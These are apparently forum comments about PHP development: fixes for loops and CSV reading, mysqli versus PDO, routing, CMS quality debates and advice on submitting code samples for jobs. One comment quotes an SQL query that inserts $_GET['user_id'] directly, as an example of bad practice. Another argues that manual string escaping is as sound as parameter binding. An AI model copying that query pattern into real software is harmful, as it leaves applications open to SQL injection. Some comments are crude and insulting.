Yep that's the one and only thing; no Photoshop. I manage to get by with GIMP and Raw Therapee (for photography), but if you are into front end stuff and use Photoshop, GIMP might not be good enough. I do seriously recommend Linux though (doesn't have to be Ubuntu, there are many flavours), it's freedom, control, and just feels awesome when you start to get the hang of it. I'm sorry my previous comment was a bit mean. I wish you good luck, and go for it with Laravel. It's 100% worth it. 
I wouldn't say never use mysqli because some infrastructures can't use PDO for whatever reason. At least he's not using regular mysql. 
Magical fairy _isset comes to the rescue - http://www.php.net/manual/en/language.oop5.overloading.php#object.isset 
Maybe you're not familiar with it, but [PHP The Right Way](http://www.phptherightway.com/) is a really nice guide for modern PHP development. Check it out!
Your while loop should look like: while($row = mysqli_fetch_array($data , MYSQLI_NUM)){ $row_reverse = array_reverse($row); ... } In other words, the fetch needs to be in the while loop clause, not the array reversing. Also, your array indexes need to be proper strings. For instance this $row[Name] should look like this $row['Name'] 
[PHP The Right Way](http://www.phptherightway.com/) says that you should calm down and enjoy the ride, man.
[This talk](http://protalk.me/your-code-sucks-lets-fix-it) is pretty good imo, but it's more about general pointers and guidelines than specifics.
Aside from the other things that are big no-no's (like including this level of logic in your template files), it looks like you're section of of code responsible for reading the contents of your CSV file is malformed. This: &lt;?php $read=fopen($filename2,a); $plaName[] = fgetcsv($read,1024); foreach($plaName as $value=&gt;$title) { echo '&lt;option value = "' . $value. '"&gt;' . $title. '&lt;/option&gt;'; } fclose($read); ?&gt; Should be more like this: &lt;?php $row = 1; if (($handle = fopen("test.csv", "r")) !== FALSE) { while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) { $num = count($data); echo "&lt;p&gt; $num fields in line $row: &lt;br /&gt;&lt;/p&gt;\n"; $row++; for ($c=0; $c &lt; $num; $c++) { echo $data[$c] . "&lt;br /&gt;\n"; } } fclose($handle); } ?&gt; Where I think you're going wrong is looping on the call to `fgetcsv`. All of the file handler functions regarding reading file contents (like `fread`) are looped over, getting chunks of the file in each iteration, which is why the `while` loop is in the second block of code. Unless you do some preprocessing, `fgetcsv` isn't aware of the values in the header row. It reads the rows in the files one by one, so the `foreach` in your code will have numeric values for `$value`. Not sure if that's what you're going for, but from the looks of it, you're expecting text-based values. That code snippet I added above is merely a guideline I pulled from [php.net](http://www.php.net/manual/en/function.fgetcsv.php), and you will need to modify that to suite your needs. It should get you headed in the right direction, though.
Of course. Just say *ORDER BY id* (or whatever the name of your ID column is). You can optionally add *DESC* or *ASC* after the column name to specify descending or ascending order.
[Ilia Alshanetsky's talks](http://ilia.ws/talks.php) cover a number of topics like performance, new features, and security. He's [authored](http://php.net/credits.php) a number of PHP modules and is part of the QA team.
Yah, PHP has really stepped up it's game the last few years. 2000 to 2009 was pretty uninspiring though.
Yep. I'd hate it too if I had people in my store all day paying me tons of money.
You're nuts if you think that's what actually happens.
You sir are literally my hero thank you so much!!!
I'm not entirely sure why, but the shop I work in, we don't have PDO availability. Something the sysadmins set up for whatever reason. Again, not entirely sure why. 
My question is this? Why should I write/maintain extra code for * Creating subscriptions on the payment gateway side. A future request from the client may ask for a subscription model not supported by payment gateway, In which case I will have to maintain 2 parallel process for subscriptions. * Receiving and parsing the notification from payment gateway, XML format. Implementing the functionality in cron script has the advantages of flexibility and less code to write/ maintain. I cannot see any disadvantage yet.
no problem, dude. glad it could be of help
Yeah thats cool, but have you heard of [PHP The Right Way](http://www.phptherightway.com/)
Oh, wow, no. That's awesome! Thanks for the helpful and informative resource! It reminds me of another great resource, called [PHP The Right Way](http://www.phptherightway.com/). It has a lot of helpful info.
Just kick back, relax, and pop open a refreshing bottle of [PHP The Right Way](http://www.phptherightway.com/)™ edit: [I Just realized you're the guy who taught me composer namespaces](https://jtreminio.com/2012/10/composer-namespaces-in-5-minutes/)
Oh wow that's a cool link, thanks!
Whining like a bitch is doing PHP The Wrong Way.
Well then you should probably delete your twitter account
The video you posted is rage-inducing because the camera misses his entire presentation, yet has tons of space on the bottom. ARGH.
Sure it shouldn't be rushed. If there is anything still unclear, then it should be discussed furthermore.. And yes, I agree with keeping warnings and notices. But in this case, it doesn't seem to me that they are discussing the implementation details. To me it's rather that some of the voters are just against making big changes to PHP. As if they already feel comfortable with it and don't want to disrupt good ol' PHP way of coding..
Ilia is the man. His talks are great and the Q&amp;A is even better. He knows his shit.
I respect your opinion, but that is bad advice and you should feel bad. Comparing [PHP The Right Way](http://www.phptherightway.com) to [PHP The Right Way](http://www.phptherightway.com) is just about the craziest thing I have ever heard.
&gt; That's not the plan, strangely. I am also a bit surprised here. 
Looking forward, when can we expect it to be pusblished?
This is one of the best talk I've heared about PHP :)
Interesting idea, it seems like the class design might be doubled for each language for the controller though, for every object in javascript would have to be mirrored in php for the interface, which could lead to a few problems, but now that im typing it out, you could even spit out the javascript from the php class so that you have control of the class design for interface through a single language, but then that just leads us right back to mixing languages... Do you know of any projects that work like how you described?
I have a project but it is not open source. The JS part of the controller pseudo code is as follows: do_ajax(action, params_object, callback) log call register callback handler make ajax call - handle retries - handle json and/or json-p - handle http error - process response - update log/profiler - execute callback return promise The PHP router program reads config file, sets up autoloader and errorhandler, checks db connection, does a bunch of logging and validation, checks authenticity of client via a XSRF token, checks HTTP type (i.e. delete requests cannot be POST or GET HTTP types and also never actually delete anything anyhow), does some other validation, then finally has a big switch statement to route the request actions to the back-end classes. The params are extracted/sanitized in the classes that make up the model. All calls return status messages back to JS routine with header info (status, error codes etc.) and data (from db, external interfaces, response codes etc.) 
Your code sucks ! Some nice ways to improve your coding skills. http://www.fullybaked.co.uk/articles/your-code-sucks-lets-fix-it
Depends on what you mean by web app. If you're talking about a RIA whose base requirement is JavaScript, by all means, do it that way. But if we're talking about a regular website, creating an unnecessary dependency on JavaScript for view logic would be ridiculous. --- Edit: A side-note: You seem to be talking about HTML/CSS as a design layer; it's not. HTML is designed to give the content structure and metainformation. The design layer is wholly in the CSS file, and it's designed to give support and uphold the content and its structure. 
Because php is a fucking template engine. Why do you want to use a template engine written on top of a template engine? And a fucking website's content should be accessible without javascript.
This is a great talk. 
&gt;And a fucking website's content should be accessible without javascript. I agree. However, since OP used the word "web app" (which means different things to different people) I'm not sure whether he's talking about a RIA which would have JS as a base requirement, or if he's talking about the web in general. 
I am talking about a web application where JS is a base requirement. Not a web site. Think large corporate sites, or think Facebook type sites. 
This is **not** a service locator pattern. A service locator pattern describes the use of a locator which is passed to a class to be used by the class to retrieve its dependencies. At best, it's a poor version of a multiton. 
Corporate websites are normally regular websites. Facebook, though, sure. Although, even here it's not a black-and-white situation. There are valid arguments to be had for loading the initial payload via PHP, depending on the use case. Page speed for one.
 Access without Javascript - how many environments work that way nowadays. Are there any devices left without Javascript? I used to think that way 5 years ago but not any more. There is absolutely ZERO reason to support a device without Javascript for a new web application. Output a nojscript section saying "Device not supported". Also I am not supporting IE6 or IE7, or the Lynx text browser and I have dropped support for Mosaic and Netscape. Did I mention the question pertains to a modern web application. You might have missed that.
Think internal, company wide, database driven web application. For example one site in development right now has 100 satellite offices around the world, 24x7 availability, multiple device entry, multiple languages - you get the idea. 
I'm not gonna let your website waste my battery until I can read wtf it is about. "Device not supported" =&gt; tab closed.
&gt;Access without Javascript - how many environments work that way nowadays. Are there any devices left without Javascript? That's an incredibly irresponsible way of thinking for a web developer, not to mention out of bounds with how the web works. Sure, a RIA has a base requirement of JavaScript, but if you're going to argue that *all* websites should have a dependency on JavaScript, rendering consumption of data without JS-support impossible, you've since long lost my support, bud. 
Nope, not all web sites. Just my RIA/web application sites. Cannot do them without JS unfortunately. Web sites are a different beast.
Then we agree.
You'll definitely want to remove the include from your router class. You might want to look into call_user_func_array() as a way to dynamically call the class (controller) you're looking for. You could change: private $routes = array( 'foo/(\d*)' =&gt; 'pages/foo.php' ); to: private $routes = array( 'foo/(\d*)' =&gt; 'Controller::method' ); And then when your regex finds a match, just do call_user_func_array('Controller::method', $params);
This is a good talk, that's why I too posted it earlier :)
I don't know why this isn't being brought up already, but PHP has a lot of higher level functions for this sort of file access. Specifically, the file() function will open a file as an array. Much easier than dicking around with file handlers and pointers. When you do that you can then use a standard foreach, giving you a normal string to work with, so fgetcsv isn't used. $csv = file('filename.csv'); foreach($csv as $row){ $rowArray = str_getcsv($row); // I can't remember what you were doing with it here // and I'm on my phone so it's a dick to find out. }
Wow, I actually didn't know about that function. Thanks! That seems a lot cleaner than what I was doing. This leads me to another concern: do you consider it more wise to use a static method or instantiate an object at that particular point? `include`ing a file was a pretty crappy way to just carry arguments along to the next part, which your suggestion seems to handle well. Would a controller in this case be a class with static methods designed to handle the incoming args and ensure the proper logic is located/setup, or am I misunderstanding how to use this?
I checked in multiple browsers and an HTML5 validator. All show the quotes missing. Since I'm relatively new to PHP, I may have been too quick to believe PHP was responsible. I just went and checked my older Perl-created pages, and see they're now doing it as well. It looks like my web hosting company just changed the server settings.
http://www.reactiongifs.com/wp-content/uploads/2013/10/conup.gif But no, I complain like a boss.
They are wrong.
The weirdest part is how we use Drupal, and the drupal install itself uses PDO, but if we try to use PDO on our end we get error messages. I'm not arguing with you, I'd much rather use PDO, but I am just making it known that sometimes mysqli has to be used instead.
Ahh, the Nerdery. I did my first Symfony 2 project there.
Thank you for sharing this. I'm going to give this a try on a test machine and see what happens. I'm excited to read about developments like this with PHP. :)
Just what the world needed ...
That's the all-too-common truth of PHP land. Far too many people managing PHP environments are willfully ignorant of doing things correctly. "We don't need to be bleeding edge. We're on version 5.2, that's the latest major version. Stop whining." You have my sympathies.
While I understand this sentiment, and while I've also never really used Joomla, I am impressed with how they are trying to improve this product and bring it into our modern PHP programming era.
Maybe I worded that wrong. I'm just advocating learning by example, in particular by using and reading libraries that are considered themselves to be very well written. &gt; There must be some sort of logic, principle, or method behind these structures and designs, and I'm certain there's a concise and/or clear way to express those things. There's a million ways to implement OOP concepts and patterns, and none are more "correct" than the others. They just have different merits (and maybe different uses). For example, I feel like I've only recently gotten a good understanding of the concept of MVC, but only after using and reading a handful of PHP implementations, some Javascript implementations, and a few examples in different languages like Ruby and Java. Maybe those implementations have "tainted" my understanding of it, but I think you get a better "feel" for the concepts by using different implementations. At this point I think I could write a pretty decent implementation of it, and one suited for my use, borrowing ideas from all the implementations I've seen.
Joomla revolves around this obscure system of menus, articles, modules, categories and positions. While it does add some flexibility, it also makes it very tedious to manage even the most basic content management tasks. What should take one step will now require five or six. If you think you're going to be able to whip up a few quick layouts and then start adding content, then you're really in for a treat.. The mvc architecture that they use has vastly improved in the 3.x releases, but it's still sort of a mess. Of the three or four big open source cms systems, joomla is hands down the worst by a long stretch. 
Fellow Nerdery Allumni, checking in. I miss David Bucklin's christmas parties.
 $query-&gt;where($this-&gt;db-&gt;quoteName('a.alias') . ' = ' . $this-&gt;db-&gt;quote($alias)); Why are they escaping quotes instead of binding parameters? Another "Joomla" thing?
I feel like that's trusting a bunch of guys who like to watch football on sunday and drink too much beer to build a competitor to the NFL.
Or breeding horses to run on gasoline.
If you're used to Code Igniter and want a lean, fast, easy to extend CMS, just go with PyroCMS. From your list there, it's exactly what you need.
&gt; go look up whether or not he was charged, update his account if so, and apologize for the error by crediting him another free X, Y, or Z. That is fine. But that is not the problem I was mentioning. How will you debug this? How will you find out what went wrong. When the process in question includes a notification message that comes from a remote location at an arbitrary time, it adds a lot more points of failure.
Finding an unreported vuln in Joomla was like an infosec junior merit badge for a long while. Not sure if that's still the case. Looks like [joomscan](http://sourceforge.net/projects/joomscan/) hasn't been updated in a bit.
I recall reading somewhere that Joomla would start using Symfony and related components in the next version (like HTTPKernel and Twig). Looking at the composer.json, this doesn't seem to be the case. Anybody know anything about this?
This was a great talk, I am passing it on to the rest of my team and my boss.
Parameter binding and direct escaping are both perfectly valid approaches. The problem is when people don't know how to do escaping correctly. Parameter binding is kind of idiot-proof, so a lot of people advocate just using that instead. But that doesn't mean string escaping is somehow insecure, if you're doing it properly and consistently. My argument is that if a person doesn't understand the importance of escaping things consistently, then he/she shouldn't be programming. It's an absolutely fundamental concept these days. Maybe you won't run into trouble with databases, because you're using parameter binding, but you will run into trouble when it comes to generating HTML and you suddenly have cross-site scripting vulnerabilities because you didn't escaping the markup correctly.
Officially, WordPress still requires MySQL. There are some third party plugins to support PostgreSQL, but they look kind of hacky. Big bummer. I don't have too much experience with Drupal, but I wasn't impressed with what I saw. Specifically, the thing was inexcusably slow and inefficient at everything. Most CMSs run well by default at low-to-moderate traffic, but require a caching layer if you want it to scale to high traffic. Last I looked, Drupal required a heavy caching layer just to survive low traffic. I guess the obvious response is, "Well, you're *supposed* to use lots of caching", but I don't think that excuses the underlying engine being a dog.
Are you thinking of Drupal 8?
Cool. A really shit pile of wank that'll cause headaches for many developers for years to come. Awesome. Personally, I refuse to apply for jobs that ask for joomla, Wordpress, Drupal or magento. Makes life so much better.
And all three of those cms's are shit. Joomla is the shittiest of three shit options.
&gt; Because php is a fucking template engine. I love the use of this phrase. It's one of those useful statements that lets me know that anything this person says should be completely ignored at all times.
I amended the google trends to include php unit. http://www.google.com/trends/explore#q=codeception%2C%20behat%2C%20phpunit&amp;cmpt=q I agree with everything said here in the comments. I just wanted to show that codeception is on the same trajectory as phpunit with far less uptake. I just wanted to point that out not to weigh in on the opinion front because i don't have enough experience with either to come to one. But rather to visually improve the trend based comparison. 
Thank you for the explanation. Another reason people might prefer parameter binding is that the query is much easier to read.
&gt; But no, I complain like a bitch FTFY 
What are the issues with CodIgniter's future? edit: The answer was much easier to find then I expected.
So... XFL?
Drupal, and Wordpress are the other two mainstream CMS systems that come to mind. Concrete5 is another that I would definitely add to the list, as well as Umbraco if you're looking for a .NET open source solution. If you're looking for something extendable, but still very client / editor friendly, I'd definitely look at Concrete5. Much easier than Drupal, much more friendly than Joomla, and more robust than Wordpress. It has a few quirks, but follows a nice design pattern and has a nice foundation to build upon. 
Concrete5 then. I'll have a look. Thanks. It doesn't look to support the database solution I am using, but if it is worth it I might push my host for mysql support.
One of the biggest pieces is the structure and readability. There is a document that talks about the Zend conventions here: http://framework.zend.com/manual/1.12/en/coding-standard.coding-style.html If you code is hard to read (and debug) that would be a problem for future devs.
We don't do any caching at all with our Drupal sites. Granted, we're running on dedicated hardware with Rackspace, not shared hosting. It certainly does like to use a lot of RAM, but luckily that doesn't matter in our situation so it's not a concern. Outside of performance, the thing I love about Drupal is how much functionality the community has already provided. It's pretty rare that I need to build something from scratch. I've trained several developers on Drupal in the last few years and, while there was definitely a learning curve, all of them took to the hook and module system quickly with a bit of support.
You're very right about this being hard to test and the lack of safety when using plugins. It is hard to give advice when this particular implementation is contextual.
A quick look at the crypt package (symmetric-key implementation), it seems there are all the "standard mistakes" made regarding safe and standard implementation of data encryption. Lack of authentication etc. Generalist developers should not design their own "crypto protocols" and put it online without a security review. This is unfortunately a good example what happens if they do.
Right, but parameter biding has the disadvantage of being harder to debug in mysql directly.
How do you disable the "always on by default caching" then?
This is a really tough question to answer to be honest with you - and not just because each employer will be looking for something different. There's so many different factors that constitute 'good code', and a few samples might not necessarily convey all that there is to convey about what you can do. Short snippets fail to demonstrate your wider ability to integrate into a larger codebase or even to work on a large project as a whole. You can get away with a lot more in smaller projects than in larger ones, because you're not going to get caught out so often when things aren't very extensible or easy to maintain (because it's a small project, so you're not likely to be building many components that interact with one another). If you show code samples from just your own work, you aren't demonstrating an ability to work with legacy code - and believe me when I say this is one of those 'cornerstone' skills that you really need to have. It's very rare that in a job you'll *just* get to write shiny new applications. Those roles do exist, but then you're looking more at startup companies and the inherent risks that go with it, to the extent that you're likely not even going to be asked to provide code samples as the more formal structures for recruitment and hiring aren't set for a startup company. On the other hand, you don't - and shouldn't - be showing large segments of production code from large projects that you've worked on in the past for other companies or individuals. It's just poor form - and demonstrates a lack of professional integrity. So, you might say you're stuck between a rock and a hard place, but it's not so bad. In the past I've treat it similarly to an exam. I try to tick the boxes. List my skills on paper - although to be honest if your CV is up to snuff you can just reference that - and then pull a half dozen or a dozen examples where I've used that particular skill, then tick that item off of the list. Once you're done you should have a list of examples which showcase your key skills. So, for example; object oriented code, an understanding of MVC or MOVE, knowledge of frameworks, security best practice, DRY / KISS code, a logical mind, legacy code and so on. The only way in which this technique falls short is that you're not demonstrating your ability to put all of those skills together in one large project working with multiple developers and writing code in a way that reflects this. I'm working on a rewrite of a half-decade old codebase right now with four developers, and there are challenges - and skills needed to meet those challenges - that come as a result of the requirements of the project and the number of people relying on each other to finish their components (we're at an early stage, so everyone is treading on toes right now). For me, the only way to get across your experience with large projects - if you have any under your belt - is to talk through them in the interview. You shouldn't be asked to provide code samples for that if the employer is decent, and nor should you be asked to log in to any CMS backend to walk them through it. You can, however, reference your examples and speak along the lines of "using examples a, b and c I created a CRUD backend for a large stock management system on which I was working alongside a small team of x developers". That should lead you naturally on to the issues you had on that project, what you learned and so on and so forth. So yes, I may have danced around the edge of your question a little, but there's a lot, lot more to an interview than code samples, but if you do need them, I think the above advice should help you out. When all is said and done, an interview is the best thing in the World. Because you can't be wrong. You can't forget your subject. It's you that you're talking about - the easiest topic in the World. Hell, I'm a seasoned veteran with two and a half decades of experience on the subject of 'me', so an interview is easy peasy. As for code samples or tests - it's simple and I'll be blunt - don't bullshit it. Show them what you can do, and by all means show yourself in the best available light. But don't make stuff up. You'll regret it so, so much. It's easy to spot those who've made things up when they're asked to do those things, and if you end up losing the job as a result of that, then your CV starts to look pretty messy and that's a lot harder to explain away than just admitting to needing more knowledge in area X. Good luck in any case - be yourself, show 'em what you can do, and whatever happens don't worry about it. They're hiring a person - not a machine. 
Actually the prepare/execute process is more than just escaping for variables. The idea is to prepare a statement once and be able to execute it multiple times. The databases (pretty much all of them right now) are optimized for this kind of operations, so there really isn't any reason for you NOT to use them. This "direct concatenation" of queries simply ignore this aspect .. because we're programmers and we know better right? Sorry, Joomla developers, you might have a lot of people who use your software because it's easy to customize, but just as Wordpress, it's just another antique system which needs a much bigger work to get up to date - the Framework might be a first step, but an even better one would have been to actually do some research before writting some crappy classes.
In my last job I hired four developers; they were brought in for interviews mostly based on the strength of existing code. Here are things I looked for. **Readability** Is the code reasonably easy to understand? Are variables well named? Are methods doing a single thing or is there a pile of completely different tasks shoved into single methods/functions? **Is the code Modern?** I don't mean is it using the lastest 5.5 PHP features. I mean is it object-oriented? If so, is it using PHP5 features? **Does the developer understand basic security?** If there's custom user auth code, does the programmer know what he's doing? I'm more likely to be impressed if someone used a vetted library vs badly doing roll-your-own. **Is the developer competent in working with databases?** You can learn a lot from the reading the queries and, if included, the database schemas. I had code from someone with 10 years experience that had things like SELECT * FROM theTable WHERE id = "{$_GET['user_id']}" These were the signals I looked for at first glance. Finally, for those I interviewed, a large portion of the interview would often revolve around the code -- what decisions were made, what trade offs and why. I did give one interview where it was painfully obvious after 10 minutes that the candidate had not actually done any of the work he presented as his own.
So what other open source CMS's would you recommend? 
They use md5 to hash passwords. It's junk.
[It's not looking great.](https://github.com/joomla/joomla-framework/blob/staging/src/Joomla/Crypt/PasswordInterface.php#L24)
There's a page cache in core that is off by default. In my experience, though, most of the caching that Drupal people are talking about is happening outside core with things like memcache or alternatives to Apache.
In all honesty, I don't know any good ones.
&gt;Parameter binding and direct escaping are both perfectly valid approaches. I am not sure they can be thought as equivalent. Sending the parameter separately from the query gaurentees that data and query wont get mixed up nullifying any attack in that direction. Direct escaping still has the "potential" for injection because it sends data and query mixed up. Your second argument is not very sound. Just because one understand the importance of escaping things doesn't mean it always have to be done manually. And how, using direct escaping in queries, makes you knowledgeable about xss and other security issues?
Well, for a start, there is a whole bunch of idiosyncratic stuff to your code that I want to flag. &lt;?PHP Don't do this. Just do `&lt;?php`. #$p-&gt;plugin_load('words'); This is not a PHP comment, it's a C comment. It technically works, but it's really not what you should be using. // is how you do that in PHP, you should be using that. function add($a,$b) { You really should be setting access modifiers to your methods. public function add($a, $b) { Now, to answer the question. The answer is probably yes. I suspect what you want is an [spl_autoload](http://php.net/manual/en/function.spl-autoload-register.php). This lets you define a pattern where if a class is attempted to be loaded but hasn't been included, it should try and include it. spl_autoload_register(function ($class) { include 'plugins/' . $class . '.class.php'; });
Because I lost my password to it and I didn't think it really mattered. I already had the file uploaded from sharing it with someone else earlier. I recovered it and put the code on github now anyway.
That being the case did you ever consider THEY weren't the problem?
No.
I agree. These huge old projects seem to be almost impossible to modernize. This seems like a pragmatic step in the right direction. For better or worse Joomla exists and is used by a ton of people. Sitting on the sidelines calling it shit is easy. Actually trying to make it better is really hard, and for that this release deserves credit.
&gt;I am not sure they can be thought as equivalent. I didn't say they're equivalent. They both have pros and cons. My point is that *they both have pros and cons*, so neither option is clearly superior for all purposes. &gt;And how, using direct escaping in queries, makes you knowledgeable about xss and other security issues? It doesn't. I'm not necessarily advocating for manually string escaping. Rather, I'm pushing back against the arguments people often make about why we should move from manually string escaping to parameter binding. The argument I've heard is that too many programmers don't really understand string escaping, so we should tell people to avoid having to escape strings. That's a very short-sighted argument, in my opinion, because the reality is that you *can't* avoid having to understand string escaping, and it's silly to even make that a goal. If you don't get why string escaping is important, then you have absolutely no grasp on software security at all, and you should sit down and learn that shit before you touch another line of code. Personally, I use whatever is best for the situation. I prefer libraries that let me use a lightweight/one-line parameterized syntax as long as it can do client-side escaping behind the scenes for one-off queries and real prepared statements for queries I'll execute multiple times in a single connection. If I'm in an environment where I only get real prepared statements *or* one-off raw string queries, and I need to execute a query that'll only run once per connection, I'll bite the bullet and use the raw string queries with manual escaping, because you'll get better performance that way at the cost of having that slightly messier concatenation code. I base my choice on what's actually going to happen under the hood.
Instead of MySQL, you can push for MariaDB to avoid using an Oracle product. MariaDB is a drop-in replacement for MySQL.
Where did I say I knew of a good one? That wasn't a requirement. I just said they were all crap, which they are. My point is perfectly valid.
They're doing a better job than Wordpress, certainly.
So you are indoctrinated with "Not Invented Here" Syndrome. I'm sure your reinvented wheels are way more round than the others, too.
No, never said that at all. I use frameworks all the time. Where are you getting your information from? Certainly not from what I wrote. 
I knew there was one out there, but I didn't know exactly how "drop in" it actually was. If the software packages I need to use can't tell the difference, then so be it. I think his main complaint was having more than one DBMS installed. He needs Postgres for a project of his, so I have that available, but he is careful and doesn't like to install anything more than what he absolutely needs.
Magento may be heavily bloated, but it's code base still streets ahead of Wordpress and Joomla. Why don't you like it?
Writing a CMS using a framework is still a form of reinventing the wheel. There are numerous CMSs out there. Will they always fit a project? No. But to disregard them for all things is definitely "Not Invented Here" syndrome.
I've not written a cms since about 2009-10... I try to keep away from those kind of projects.
If you decide to compile your PHP/${package} you make it a bit harder to tear down your VM and rebuild, because you have to wait for recompilation over and over again. This can be mitigated by creating a base box with all your packages already instead and preconfigured. Look into Packer, also by the same guy who made Vagrant.
People aren't going to download random tarballs anymore to look through open source code.
If I knew of a decent cms in php I'd say so. The fact that I don't know of any isn't me being unhelpful - it's me answering your question.
Ok, so you dont have projects that clients need to be able to maintain? Since this is a discussion/link about CMSs, then maybe you should just stay out of it.
You have just said that you don't use CMS so you are being unhelpful by contributing to a discussion you know nothing about.
Who says I don't know anything about them? I inherited a wordpress system a couple of years ago actually, and had to hack some of the wordpress core to do some stuff. Couldn't believe how awful the core of wordpress is. Absolutely shocking code. 
You **can** comment on whatever you like. It is still unhelpful if you don't work with CMSs and you haven't worked with either of the ones you disparage for at least 3 years, I'm guessing more. You are here to spread FUD, and it doesn't help OP at all.
This is really helpful, thanks. I did a forum search and according to a thread Concrete5 should work with it, installation and everything. In case anyone else is following this discussion, here's the thread: http://www.concrete5.org/community/forums/chat/concrete5-on-mariadb/
If you had to hack the core, you did it wrong. There are more than enough hooks and filters to do what you need.
I inherited wordpress and had to do one thing. I did actually have to hack the core because I had to override wordpress to do something the wordpress security code tries to prevent you to do. There may well have been some way to do it without hacking the core, but I couldn't see an easy way to do it - it was central to how wordpress deals with user logins. Anyway, I wrote it in such a way that wordpress updates still worked and I didn't have to update anything, so it worked. Still, I got to read much of the wordpress core code, and really got an appreciation for how terrible it is. And this is the core, not just some crappy plugins written by some cowboys.
Percona as well. 
Why would you want to compile your own PHP version rather than using the debian package?
Magento 2.0 is coming, which should make the whole thing much better to work with. Check out their github page, lot's of improvements to the way they do things. EAV is necessary for Magento sadly and requires some getting used to.
EAV is an anti pattern though. Check out this book (it's a great book in general btw - I got a lot from it): http://pragprog.com/book/bksqla/sql-antipatterns
Like I just said, if you had to hack the core of Wordpress, you did it wrong. You are a super pro dev, but you can't read the docs for the right hook/filter? Your comments are unhelpful because he asked about CMS. That means he is likely looking for something a client would be able to log into and maintain. In another thread, you mention frameworks. Frameworks are great, I use Symfony. However, there are many use-cases where a drop-in CMS like Wordpress will save you a lot of coding time compared to a raw framework. 
You could definitely use call_user_array_func with an instantiated object like this: $my_obj = new MyObj(); call_user_array_func(array($my_obj, 'method'), $params); Whether you would want to do that is a different question. I would prefer non-static over static but you'd probably want a higher level object to manage your controller object. Usually that's done with either a global or a singleton class. Something like: $app = new MyApp(); $app-&gt;route(); $app-&gt;to_controller(); $app-&gt;parse_view(); $app-&gt;send_response(); ... etc. You might look into how some of the popular frameworks have handled their routing. They don't have the only answers but they have all had to solve this exact problem already. Maybe check out Laravel, Symfony, and Slim. Slim is especially easy to read along with. 
Because it's really not that much of a hassle, far as I'm concerned.
&gt;If you decide to compile your PHP/${package} you make it a bit harder to tear down your VM and rebuild, because you have to wait for recompilation over and over again. I realize that. &gt;This can be mitigated by creating a base box with all your packages already instead and preconfigured. Look into Packer, also by the same guy who made Vagrant. Sounds good. I'll have to add that to my bookmarks. Thanks.
I had to edit the wordpress login to login to two systems at the same time - one, the wordpress system, and the second, a Zend framework system skinned to look like the same site, but which provided the backend. I also had to have the Zend Framework system create the wordpress users + set the password so wordpress could accept it instead of having wordpress create the users. The dual login had to work for both the main www site and a subdomain of the same site. You reckon you can do this with wordpress hooks? Even if you could - I managed to do it in such a way that the system worked even after upgrading wordpress, so no harm was done and the project was successful. I left the company a couple of months ago, and that system is still working nicely - think it's been running for something like 15 months now, so it seems I did the job perfectly well. And yes, I can appreciate that CMS's can be useful for some things, but in my experience, the kind of clients you work with when you're building wordpress sites are usually small scale, so you end up pissing around with crap code for small rewards. I decided I never wanted to work with terrible code again if I could help it, so I became really choosy about who I work with.
This is all very specific to you. Cool. That does not mean it is helpful to others. Since you don't work with those "kind of client's", nobody should? Yes, the hack you did was easily done with hooks/filters/wp_functions. You got your hack to work... but you had to hack and read the awful code. If you had used the hooks/filters you wouldn't have even had to deal with the awful parts of the code. You are a very lazy developer if you can't read the docs.
The point is that the awful code is wordpress itself. It's just poor code. I'd love to see a nice CMS system that is both good for everyday users like wordpress is, but is also properly written so that developers can actually work with it in a sane way. Something based on Symfony for example. Anyway, I hope to never have to touch a cms again if I can help it :-)
Cool, I'm glad you feel that way, but your advice is not helpful to others asking about a CMS.
Did you completely forget what this thread was about? Go ahead and check the context. It was specific questions about Joomla, then, someone mentioned the big 3 CMS. Then you replied. This is a discussion about CMS, quit trying to hijack it just to preach from your soapbox.
How would you suggest formatting the IF? Is the extra line feeds you are talking about? And yes, I do them like that, jsut without the line feeds
And all my points were about how bad the well known php cms systems are, and how there are better options for developers. My points are fine, and what's more they're accurate. If you're only used to dealing with these terrible systems, then perhaps you consider godawful code and banging your head against the wall to be part of your job description? I'm just saying it doesn't have to be. Not sure how that's off topic at all. It really isn't.
I guess so, but I fixed it. Doesn't matter anyway since it's been down voted off now I think.
 if(true){ // stuff } // or if(true) { // stuff } These would both be acceptable to me. The former especially, as it's PSR style, and that shows that you know the value of an established standard. The latter isn't used by many. And I meant both/either the superfluous indenting and the double spacing. I've seen both done and I think they're very poor choices. I'd recommend against using this indenting stand at when sending code samples. Ideally refactor to PSR-2 and you'll have a better chance of not bugging reviewers. Ultimately this is about getting a job. It doesn't matter what **you** like. 
I don't mean to sound like a Negative Nelly here, but this sounds like something I'd be very interested to read an article on. But not buy a book about. 
Send it back to hell where it belongs! Edit: to clarify, I haven't clicked the link
Glad you guys liked it! FWIW, I'm writing a book using that talk as a starting point. Find out more here: http://mlaphp.com
&gt; if(true){ must be &gt; if (true) { to fit PSR. 
That's not saying much. Wordpress has a brilliant UI, but their codebase is straight out of the dark ages. Joomla has been MVC for almost 7yrs.
Joomla 3.2 (The cms) uses bcrypt. Joomla takes security seriously. It also has two-factor authentication built in. People can use Yubikeys to log into their websites. 
For better or worse, Wordpress is definitely on the short list of *any* CMS. It's absurdly popular - generally, for all the worst reasons. http://w3techs.com/technologies/overview/content_management/all 
What's wrong with self taught coders?
Lots of in depth discussion in this thread but this part jumped out at me: &gt;I can't work vi Neither can I. I hate vi and most command line editors. If you're in the same boat, do yourself a favor and just use nano. It's very very easy. Nothing too crazy, and all the controls are listed out for you at the bottom of the screen at all times. 
What should they use instead?
The simplest answer I could give is to just say why I would have a problem with this. I should say from the outset that your formatting isn’t inherently bad. I wouldn’t reject that. Like, if I was sent a code sample formatted like that I wouldn’t mark against it. I wouldn’t mark for it either, it would be a non-issue either way. It’s entirely fine, completely readable, and consistent, yes. It doesn’t do anything dumb. But that wasn’t really the question you asked. The question you asked was essentially why should I care that there’s a specific standard such as PSR in place. The answer is that it depends whether you work in a team or not. When you work as part of a team there’s an expectation that everyone be working on the same code. You don’t get you say that your standard is good enough, etc. You have to maintain consistency of code so that people working on it together can work from the same page. This is true whether you’re actively working as a team, or whether other people have to edit, fix, upgrade, code-review, or whatever. And the best way to achieve that is to enforce an objective, external coding style. In isolation it doesn’t matter. But there is no “Fuck it, my way is perfectly fine” in team. 
